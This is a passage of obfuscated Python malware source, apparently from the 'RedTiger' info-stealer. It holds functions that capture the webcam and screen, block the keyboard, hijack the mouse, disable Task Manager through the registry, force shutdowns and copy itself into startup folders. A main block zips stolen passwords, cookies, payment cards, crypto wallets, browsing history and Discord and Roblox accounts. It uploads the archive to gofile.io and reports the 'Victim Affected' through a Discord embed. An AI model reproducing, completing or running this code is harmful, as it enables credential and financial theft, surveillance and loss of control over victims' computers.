        CYADMSADEZQYJXOWKRKVJIBTXKRUODSXWDPLQNALCIOGNHFPKDQAGCLZTXULVVHUGGEBQBLXZRPIKXYEJY = Image.fromarray(UMTZKLKLPDORAHZDVDTUYJURJWVBODRJYRXBRKZKDDXAVTHUJEBXGPOGYJNSLJGDRUNQ)
        FTUGONUYSFWMRZKNJFOLQFLTPIDEGWJWGKJXCMXOVCLHWJZPONUQUISTRWUXLJZMBAAFBJUJMFAO = io.BytesIO()
        CYADMSADEZQYJXOWKRKVJIBTXKRUODSXWDPLQNALCIOGNHFPKDQAGCLZTXULVVHUGGEBQBLXZRPIKXYEJY.save(FTUGONUYSFWMRZKNJFOLQFLTPIDEGWJWGKJXCMXOVCLHWJZPONUQUISTRWUXLJZMBAAFBJUJMFAO, format='PNG')
        FTUGONUYSFWMRZKNJFOLQFLTPIDEGWJWGKJXCMXOVCLHWJZPONUQUISTRWUXLJZMBAAFBJUJMFAO.seek(0)
        KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr("Webcam.png", FTUGONUYSFWMRZKNJFOLQFLTPIDEGWJWGKJXCMXOVCLHWJZPONUQUISTRWUXLJZMBAAFBJUJMFAO.read())

        return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture

    except Exception as e:
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture = f"Error: {e}"
        return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture

def JYTAKZJBYWEHACHNXHLGECFCJEICSCQXDAQEPLAVENYAZWHXKMLWTSMIENUFKUDQ(zip_file):
    import io
    from PIL import ImageGrab

    try:
        MQDFCMBNJHFOFRWEFOQZGFLMSZLNKVIHVSSYXYNDMLEIKAFVPIMWOGYLCQQSQURLZNNYDPUTSROLWKHAYN = "Yes"

        def C4ptur3():
            LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV_bytes = io.BytesIO()
            LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV.save(LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV_bytes, format='PNG')
            LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV_bytes.seek(0)
            return LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV_bytes

        LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", LFZZBPMXJXWPJLSPGGBDVOLYSXNXVMWPNZTJTFJPTUGIEFSTKPSIDKSARV_bytes.read())
        return MQDFCMBNJHFOFRWEFOQZGFLMSZLNKVIHVSSYXYNDMLEIKAFVPIMWOGYLCQQSQURLZNNYDPUTSROLWKHAYN
    except Exception as e:
        MQDFCMBNJHFOFRWEFOQZGFLMSZLNKVIHVSSYXYNDMLEIKAFVPIMWOGYLCQQSQURLZNNYDPUTSROLWKHAYN = f"Error: {e}"
        return MQDFCMBNJHFOFRWEFOQZGFLMSZLNKVIHVSSYXYNDMLEIKAFVPIMWOGYLCQQSQURLZNNYDPUTSROLWKHAYN

def LFAHZHQIMQPZWEACTKDURCPUPWTWWTWXMLJNEWVHHTDIIZKMMDVTKVSTSKBYQLYWKALFNJVWRDMREPIHCKBMDTYRTGCSFWJR():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def NQMDEOVDKNVIADWORURKIRDGZMSNRLXWHCTCTXEVCNJLCOIZSMZJVOAT():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass

def CSLHXMZSGHEKOEDEALIPNWPKGWSXQXTJNOVYRWCMJNNLWAYTSKQZK():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

def OWYQWGLKULYQRUSKDWJYXSIFLMJTFTGTPANCENNLWFKQVVGPNBQXVKOMUZFBILFZDXSLXBQZUYHIXDGIITZDBTMCVTAJ():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def NIEBTHBWBLAZTFBGVJHBTDQSBPFJEBIWZYLVXCDPFDAVUQBBPELVSTPCGAELWGGYHDSRZSUNUSMCFWTXUBWMGTLVN():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')

def St4rtup():
    import os
    import sys
    import shutil

    try:
        GTYXHMOLMQCNQTSUBALFNFTPTOKVDCGIIAXPZEFQEOVUVDEXNKBFLYUUZWBIQNTQTAPTWOZSFXOMSWGQLJFRLSJ = os.path.abspath(sys.argv[0])

        if GTYXHMOLMQCNQTSUBALFNFTPTOKVDCGIIAXPZEFQEOVUVDEXNKBFLYUUZWBIQNTQTAPTWOZSFXOMSWGQLJFRLSJ.endswith(".exe"):
            RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKR = "exe"
        elif GTYXHMOLMQCNQTSUBALFNFTPTOKVDCGIIAXPZEFQEOVUVDEXNKBFLYUUZWBIQNTQTAPTWOZSFXOMSWGQLJFRLSJ.endswith(".py"):
            RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKR = "py"

        KKLPNOBMPONWSZDWCBJCDDCBKTIKCETKWNTZFWOAPQFQBDQFGWMSROYUWQGDF = f"ㅤ.{RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKR}"

        if sys.platform.startswith('win'):  
            SWDFLRUTDFVFMLOGPQSSUGJVCVOEKFWJFDRGAMPBXEWTLIELFZQRMSUWCKKVUDXYQVDBYHZYPOSMGTRHOFZGCSA = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            SWDFLRUTDFVFMLOGPQSSUGJVCVOEKFWJFDRGAMPBXEWTLIELFZQRMSUWCKKVUDXYQVDBYHZYPOSMGTRHOFZGCSA = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            SWDFLRUTDFVFMLOGPQSSUGJVCVOEKFWJFDRGAMPBXEWTLIELFZQRMSUWCKKVUDXYQVDBYHZYPOSMGTRHOFZGCSA = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ_new_file = os.path.join(SWDFLRUTDFVFMLOGPQSSUGJVCVOEKFWJFDRGAMPBXEWTLIELFZQRMSUWCKKVUDXYQVDBYHZYPOSMGTRHOFZGCSA, KKLPNOBMPONWSZDWCBJCDDCBKTIKCETKWNTZFWOAPQFQBDQFGWMSROYUWQGDF)

        shutil.copy(GTYXHMOLMQCNQTSUBALFNFTPTOKVDCGIIAXPZEFQEOVUVDEXNKBFLYUUZWBIQNTQTAPTWOZSFXOMSWGQLJFRLSJ, BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ_new_file)
        os.chmod(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ_new_file, 0o777) 
    except:
        pass

def MWBCVRZHDBPJGBVCNSSIZMLIFGNSDIERKZHDOZFKRMLLHELIVOPBNRUOFKMQEHTSCLJJDKWWVGGXZRBYCQX():
    import keyboard
    while True:
        try:
            CSLHXMZSGHEKOEDEALIPNWPKGWSXQXTJNOVYRWCMJNNLWAYTSKQZK()
            PWXQTQFCVDHIEQZFDKHAKJFOBBKVBJAJGKEEIVPNTTFQYXFGJA()
            TLTBUTCPRTILOFOTHGLQZGTANPPFSUVTYZVMVMJLKDGERQARVZYRPLWHSRPTZXGIHEMYVHTJCHIMNDQAFRQ()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO = []

GJYGJTCMAWMUPQOQAERCESFVZOJGDUOMKQIXQWNBORRVINYQRKLUEWTTAVHAYWZGQWQAJOTDKXZ = io.BytesIO()
with zipfile.ZipFile(GJYGJTCMAWMUPQOQAERCESFVZOJGDUOMKQIXQWNBORRVINYQRKLUEWTTAVHAYWZGQWQAJOTDKXZ, "w", zipfile.ZIP_DEFLATED) as KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW:

    try: 
        BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ = ZXWYUZWGKKUBPHXTZHMTSDCXIXJZIFYXXERXAUXIUIIYWFIZFRNLPRNJNQTKJDSELBOLDFHHSWPFJICNUWAXAZFVGKCFUCJLXH()
    except Exception as e:
        BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ = f"Error: {e}"

    try: 
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info = KJFLZUDLLTVLMBFXIHFMUJXGGYSGIMVAXBBSBUFNQOCGYMVRNRTGIGVZW(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info = f"Error: {e}"

    try: 
        TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS = LFWBQOTYUYEAWXBQUACEETELSYTQUUSUTCAEAYHXDVDZIJTAUCTJCLYXMZKVZZAPU(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS = f"Error: {e}"

    try: 
        WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ, IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ, OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO, LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK, THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF, ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU = MYVPZQOBGUQVVOOBSDXDRPXGIDPSEMBXILTUYSPCJBIMLNZFPZCHAUECVAGDTTRWPXCVAIPVEMDCUFMDFSUBFNJGVYHULT(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ = f"Error: {e}"
        IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ = f"Error: {e}"
        OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO = f"Error: {e}"
        LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK = f"Error: {e}"
        THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF = f"Error: {e}"
        ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU = f"Error: {e}"

    try: 
        NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN = KCWMZUFPOPCWMFWMVQJLPDUBNBLENXZGUPCGBKYNYILRKAWPRLMPLCYMDAUHATHHHPSTSQCDBIHATPIEHNQHDD(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN = f"Error: {e}"

    try: 
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture = UGBTNFNZJMYXUOKYEXQDASSBEOEUQRSSRJEBBLSNRYOYNMQAGEHJVGBWPUOVJWMPNC(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture = f"Error: {e}"

    try: 
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_screenshot = JYTAKZJBYWEHACHNXHLGECFCJEICSCQXDAQEPLAVENYAZWHXKMLWTSMIENUFKUDQ(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_screenshot = f"Error: {e}"

    try: 
        PFWBHOQRXKOHXQJQIZCVLKANKVBXWAZAMTGBOGIRPHIDOGFNLDMLHSQCZDBGLXSJCDCLHRPWXZKAHGUIUONFYPDUMROISAGELSKA, VDDZDOFELGGUXDYQUPFNEVVYRCTQBBQHKJQKIBRQLDYKCAPGSWLRUFFTXVAUPBNSPIDERQZDPFEHOQJTAMSZYOYZKDKEZTJ, DVXGFDWVEVMMGTLMOVNDFPQDUODFVWJTKHYPIGETUJTNDJRVMZUGVILOWHHXJSOWXCEJHOUNQUEK = RMRGMMRYLZBCOVUIFUGEITVVBPPMQCCYUEWLYYOSPBUMQGNPVCVNXQZTXHWMERUZDIRPUYYGGOBUSLJJZMWPVRIUKWMPEGC(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_screenshot = f"Error: {e}"

    try: 
        OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE = SICIIMFQHANBEDZFEPWSIQSIDAMPVXRHRXPTQISLZYCPBDRCLRAMJZIPTLNANAMSBJZNGURMHIMIHSFOYBPAARZNWJGRAHJ(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW)
    except Exception as e:
        OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE = f"Error: {e}"

    if BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Discord Injection : {BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ}")

    if ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Camera Capture    : {ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture}")

    if ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_screenshot != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Screenshot        : {ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_screenshot}")

    if ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"System Info       : {ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info}")

    if TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Discord Accounts  : {TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS}")

    if NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Roblox Accounts   : {NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN}")

    if IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Passwords         : {IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ}")

    if OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Cookies           : {OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO}")

    if ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Cards             : {ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU}")

    if LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Browsing History  : {LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK}")

    if THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Download History  : {THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF}")

    if WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Extentions        : {WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ}")

    if PFWBHOQRXKOHXQJQIZCVLKANKVBXWAZAMTGBOGIRPHIDOGFNLDMLHSQCZDBGLXSJCDCLHRPWXZKAHGUIUONFYPDUMROISAGELSKA != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Wallets           : {PFWBHOQRXKOHXQJQIZCVLKANKVBXWAZAMTGBOGIRPHIDOGFNLDMLHSQCZDBGLXSJCDCLHRPWXZKAHGUIUONFYPDUMROISAGELSKA}")

    if VDDZDOFELGGUXDYQUPFNEVVYRCTQBBQHKJQKIBRQLDYKCAPGSWLRUFFTXVAUPBNSPIDERQZDPFEHOQJTAMSZYOYZKDKEZTJ != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Game Launchers    : {VDDZDOFELGGUXDYQUPFNEVVYRCTQBBQHKJQKIBRQLDYKCAPGSWLRUFFTXVAUPBNSPIDERQZDPFEHOQJTAMSZYOYZKDKEZTJ}")
    
    if DVXGFDWVEVMMGTLMOVNDFPQDUODFVWJTKHYPIGETUJTNDJRVMZUGVILOWHHXJSOWXCEJHOUNQUEK != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Apps              : {DVXGFDWVEVMMGTLMOVNDFPQDUODFVWJTKHYPIGETUJTNDJRVMZUGVILOWHHXJSOWXCEJHOUNQUEK}")
    
    if OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE != None:
        GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO.append(f"Interesting Files : {OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE}")

GJYGJTCMAWMUPQOQAERCESFVZOJGDUOMKQIXQWNBORRVINYQRKLUEWTTAVHAYWZGQWQAJOTDKXZ.seek(0)

try:
    try: MWVDGMTRZNQWYSLDSFUFKKUPMYLDBLJXLAJMWMPJDDARCRUNJEDOKQQRFPYGLQWHMHVEOGXUNVSOUBJPD = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: MWVDGMTRZNQWYSLDSFUFKKUPMYLDBLJXLAJMWMPJDDARCRUNJEDOKQQRFPYGLQWHMHVEOGXUNVSOUBJPD = "store4"

    OCZNGOBLJFWDEMFSMDUMVIEPJCFADCALHLUDWKQPOBECYSJRZJ = requests.post(
        f"https://{MWVDGMTRZNQWYSLDSFUFKKUPMYLDBLJXLAJMWMPJDDARCRUNJEDOKQQRFPYGLQWHMHVEOGXUNVSOUBJPD}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{BJFTZVPNDTUSITXPRZGIGHMNXVIUZCKJALYICJKKCWPJUFFJYRRGKNUTMSGXUZLKRZVPMASXZSQWOLYAQFUSCS.replace(' ', '_')}.zip", GJYGJTCMAWMUPQOQAERCESFVZOJGDUOMKQIXQWNBORRVINYQRKLUEWTTAVHAYWZGQWQAJOTDKXZ)}
    )

    DTVMTFOATDWCCZWWBSXYGALCQCOMKQKKVBVGVLSHTOMPSKIADP = OCZNGOBLJFWDEMFSMDUMVIEPJCFADCALHLUDWKQPOBECYSJRZJ.json()["data"]["downloadPage"]
except Exception as e:
    DTVMTFOATDWCCZWWBSXYGALCQCOMKQKKVBVGVLSHTOMPSKIADP = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=ASKWZPHCCQUTTFFWYXRKAQQYASYKURZDIODVNYFPTNCNGIKTPKGZMNHZFSIXNSAWZWWFLCSALVQNFACEBSVTEGPVBIONHJJOBZV
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {BXBJHLVWDMAFCBOSPVWEZRTIZDPPWCDUEOOPGUGPQNNWGTKAHIARENMYEDMAGVEYVUSFREGSMMTNIXJQMYULFHXWPHXYE}
Username    : {BJFTZVPNDTUSITXPRZGIGHMNXVIUZCKJALYICJKKCWPJUFFJYRRGKNUTMSGXUZLKRZVPMASXZSQWOLYAQFUSCS}
DisplayName : {LQFGKMIUJJOUHMJQYLQAVJITSZMUQNJRJBFMDUBXSYFXTUDGCKS}
Ip Public   : {LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK}
Ip Local    : {WNXYILYQOUEISQJRNUZDUHWRMINOATIHTYVXRUFXUPWXCHWKPWBPBZHVBURZBMOJSWOAFVHFTZVV}
Country     : {WPZVJULFQZPAHMWEUFPJLROWQDCTRVWGBDCKSOMTZIREQLABRAIVOXVKFLZXTECYMDIEJFVZRAVGDBBWLAPKNJUQBYPQDPOE}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(GNVPYITEFRPRLQWACUSNUSBRGVMKYXLTGAAUARWPXBUFHBLVVIWAJRVWRHRFXWILPEPBWGLRGOOLZYLVPSXOETWLO)}```"""
).add_field(
    inline=False,
    name="Download Link", 
